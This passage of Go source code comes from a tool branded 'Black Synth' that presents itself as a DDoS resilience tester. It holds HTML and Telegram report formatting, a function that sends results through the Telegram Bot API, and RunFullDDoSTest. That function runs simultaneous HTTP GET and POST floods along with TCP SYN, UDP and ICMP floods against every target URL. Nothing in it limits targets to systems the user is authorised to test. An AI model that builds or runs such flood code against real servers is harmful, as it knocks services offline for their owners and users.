<tr><th>Characteristic</th><th>Status</th></tr>
<tr><td>Firewall / Protection Detected</td><td>%s</td></tr>
<tr><td>Rate-Limiting Active</td><td>%s</td></tr>
<tr><td>Behavior Curve</td><td>%s</td></tr>
<tr><td>Server Recovery Detected</td><td>%s</td></tr>
</table>


<div class="verdict">
<h3>Summary Verdict:</h3>
<p><strong>%s</strong></p>
</div>


<div class="chart-section">
<h3>Success vs Failure per Target URL</h3>
<img src="data:image/png;base64,%s" style="width:100%%;max-width:650px; height:auto; display:block; margin: 15px auto;" alt="Success vs Failure Chart"/>
<p style="font-size:0.9em; color:#bbb;">This chart visually represents the breakdown of successful and failed requests for each target URL.</p>
</div>


<div class="footer">
<p>&copy; %d Black Synth. All rights reserved.</p>
<p>Report generated on: %s</p>
</div>
</div>
</body>
</html>
`,
		func() string {
			var b strings.Builder
			for _, u := range targetURLs {
				b.WriteString(fmt.Sprintf("<li><a href=\"%s\" style=\"color:#8ab4f8; text-decoration:none;\">%s</a></li>", u, u))
			}
			return b.String()
		}(),
		summary["TestDuration"],
		summary["WorkersSpawned"],
		summary["ConcurrencyLevel"],
		summary["TotalRequestsSent"],
		summary["SuccessfulResponses"],
		summary["FailedResponses"],
		getSuccessRateColorClass(summary["SuccessRatePercent"].(float64)),
		summary["SuccessRatePercent"],
		summary["AverageResponseTimeMs"],
		summary["MedianResponseTimeMs"],
		getDDoSResistanceScoreColorClass(summary["DDoSResistanceScore"].(float64)),
		summary["DDoSResistanceScore"],
		summary["EstimatedThresholdBeforeCollapse"],
		summary["LoadClass"],
		summary["Timeouts"],
		summary["ConnectionErrors"],
		getFailureCountColorClass(summary["RateLimitedResponses"].(int)),
		summary["RateLimitedResponses"],
		getFailureCountColorClass(summary["BlockedResponses"].(int)),
		summary["BlockedResponses"],
		getFailureCountColorClass(summary["ServerErrors"].(int)),
		summary["ServerErrors"],
		summary["Redirects"],
		firewallStr,
		rateLimitStr,
		summary["BehaviorCurve"],
		serverRecoveryStr,
		summary["SummaryVerdict"],
		chartBase64,
		time.Now().Year(),
		time.Now().Format("Jan 02, 2006 15:04:05 MST"),
	)
}

// Helper for dynamic class based on success rate
func getSuccessRateColorClass(rate float64) string {
	if rate > 90 {
		return "highlight"
	} else if rate > 70 {
		return "warning"
	}
	return "danger"
}

// Helper for dynamic class based on DDoS resistance score
func getDDoSResistanceScoreColorClass(score float64) string {
	if score > 90 {
		return "highlight"
	} else if score > 70 {
		return "warning"
	}
	return "danger"
}

// Helper for dynamic class based on failure counts
func getFailureCountColorClass(count int) string {
	if count > 0 {
		return "danger"
	}
	return ""
}

// SendTelegramMessage sends a text message to the configured Telegram chat using Bot API
func (d *DDoSTester) SendTelegramMessage(message string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", d.tgBotToken)

	data := url.Values{}
	data.Set("chat_id", fmt.Sprintf("%d", d.tgChatID))
	data.Set("text", message)
	data.Set("parse_mode", "HTML")

	log.Printf("Sending Telegram message to chat ID %d with payload:\n%s", d.tgChatID, data.Encode())

	resp, err := http.Post(apiURL, "application/x-www-form-urlencoded", strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Error sending Telegram message: %v", err)
		return fmt.Errorf("failed to send telegram message: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, _ := ioutil.ReadAll(resp.Body)
	bodyStr := string(bodyBytes)

	log.Printf("Telegram API response status: %s", resp.Status)
	log.Printf("Telegram API response body: %s", bodyStr)

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned status %s: %s", resp.Status, bodyStr)
	}

	return nil
}

// GenerateTelegramReport formats the summary into a plain text message for Telegram
func GenerateTelegramReport(summary map[string]interface{}) string {
	targetURLs := strings.Join(summary["TargetEndpoints"].([]string), ", ")

	firewallDetected := "No"
	if summary["FirewallProtectionDetected"].(bool) {
		firewallDetected = "Yes"
	}
	rateLimitingActive := "No"
	if summary["RateLimitingActive"].(bool) {
		rateLimitingActive = "Yes"
	}

	behaviorCurve := summary["BehaviorCurve"].(string)
	if behaviorCurve == "Unstable" {
		behaviorCurve = "Unstable (potential issues detected)"
	} else {
		behaviorCurve = "Stable"
	}

	return fmt.Sprintf(
		"<b>Black Synth DDoS Test Results</b>\n\n"+
			"📈 <b>Summary for:</b> %s\n"+
			"➡️ <b>Total Requests:</b> %d\n"+
			"✅ <b>Successful:</b> %d\n"+
			"❌ <b>Failed:</b> %d\n"+
			"📊 <b>Success Rate:</b> %.2f%%\n"+
			"⏱️ <b>Avg Response Time:</b> %.2f ms\n"+
			"🚀 <b>DDoS Resilience:</b> %.2f%%\n\n"+
			"🛡️ <b>Protections:</b>\n"+
			" - Firewall Detected: %s\n"+
			" - Rate Limiting Active: %s\n\n"+
			"📉 <b>Key Issues:</b>\n"+
			" - Timeouts: %d\n"+
			" - Connection Errors: %d\n"+
			" - Server Errors (5xx): %d\n\n"+

			"⚔️ <b>Attack Traffic Summary:</b>\n"+
			" - HTTP GET: Sent %d, Success %d, Failure %d\n"+
			" - HTTP POST: Sent %d, Success %d, Failure %d\n"+
			" - TCP SYN Packets Sent: %d\n"+
			" - UDP Packets Sent: %d\n"+
			" - ICMP Packets Sent: %d\n\n"+

			"💡 <b>Verdict:</b> %s\n\n"+
			"<i>(Full report with details and charts sent to email.)</i>",
		targetURLs,
		summary["TotalRequestsSent"],
		summary["SuccessfulResponses"],
		summary["FailedResponses"],
		summary["SuccessRatePercent"],
		summary["AverageResponseTimeMs"],
		summary["DDoSResistanceScore"],
		firewallDetected,
		rateLimitingActive,
		summary["Timeouts"],
		summary["ConnectionErrors"],
		summary["ServerErrors"],
		summary["HTTPGetSent"],
		summary["HTTPGetSuccess"],
		summary["HTTPGetFailure"],
		summary["HTTPPostSent"],
		summary["HTTPPostSuccess"],
		summary["HTTPPostFailure"],
		summary["TCPSynSent"],
		summary["UDPPacketsSent"],
		summary["ICMPPacketsSent"],
		summary["SummaryVerdict"],
	)
}

// New function added as requested: RunFullDDoSTest
// Runs a full DDoS test with all attack vectors for a specified duration and returns summary and report
func (d *DDoSTester) RunFullDDoSTest(ctx context.Context, duration time.Duration) (string, map[string]interface{}, error) {
	var allSessions []SessionDetail
	var totalStats AttackStats

	ctx, cancel := context.WithTimeout(ctx, duration)
	defer cancel()

	var wg sync.WaitGroup
	var mu sync.Mutex

	workersPerURL := d.workers / len(d.urls)
	if workersPerURL == 0 {
		workersPerURL = 1
	}

	for _, targetURL := range d.urls {
		hostname := extractHostname(targetURL)

		// HTTP GET workers
		for i := 0; i < workersPerURL; i++ {
			wg.Add(1)
			go func(url string) {
				defer wg.Done()
				client := &http.Client{Timeout: 10 * time.Second}
				for {
					select {
					case <-ctx.Done():
						return
					default:
						mu.Lock()
						totalStats.HTTPGetSent++
						mu.Unlock()

						req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
						if err != nil {
							log.Printf("RunFullDDoSTest HTTP GET: NewRequest error: %v", err)
							return
						}
						start := time.Now()
						resp, err := client.Do(req)
						durationMs := time.Since(start).Milliseconds()
						sd := SessionDetail{
							Timestamp:  time.Now(),
							DurationMs: durationMs,
							URL:        url,
						}
						if err != nil {
							sd.Status = "failure"
							sd.ErrorMsg = err.Error()
							mu.Lock()
							totalStats.HTTPGetFailure++
							mu.Unlock()
						} else {
							sd.StatusCode = resp.StatusCode
							if resp.StatusCode >= 200 && resp.StatusCode < 300 {
								sd.Status = "success"
								mu.Lock()
								totalStats.HTTPGetSuccess++
								mu.Unlock()
							} else {
								sd.Status = "failure"
								sd.ErrorMsg = fmt.Sprintf("HTTP %d", resp.StatusCode)
								mu.Lock()
								totalStats.HTTPGetFailure++
								mu.Unlock()
							}
							io.Copy(ioutil.Discard, resp.Body)
							resp.Body.Close()
						}
						mu.Lock()
						allSessions = append(allSessions, sd)
						mu.Unlock()
						runtime.Gosched()
					}
				}
			}(targetURL)
		}

		// TCP SYN flood
		wg.Add(1)
		go func(target string) {
			defer wg.Done()
			d.tcpSynFloodWithStats(ctx, target, duration, &totalStats)
		}(hostname)

		// UDP flood on port 80
		wg.Add(1)
		go func(target string) {
			defer wg.Done()
			d.udpFloodWithStats(ctx, target, 80, duration, &totalStats)
		}(hostname)

		// ICMP flood
		wg.Add(1)
		go func(target string) {
			defer wg.Done()
			d.icmpFloodWithStats(ctx, target, duration, &totalStats)
		}(hostname)

		// HTTP POST flood
		wg.Add(1)
		go func(url string) {
			defer wg.Done()
			d.httpPostFloodWithStats(ctx, url, duration, &totalStats)
		}(targetURL)
	}

	wg.Wait()

	cycles := []CycleData{{Sessions: allSessions}}

	reportJSON, summary := GenerateDetailedReport(cycles, time.Now().Add(-duration), time.Now(), d.workers, duration, d.urls)

	return reportJSON, summary, nil
}
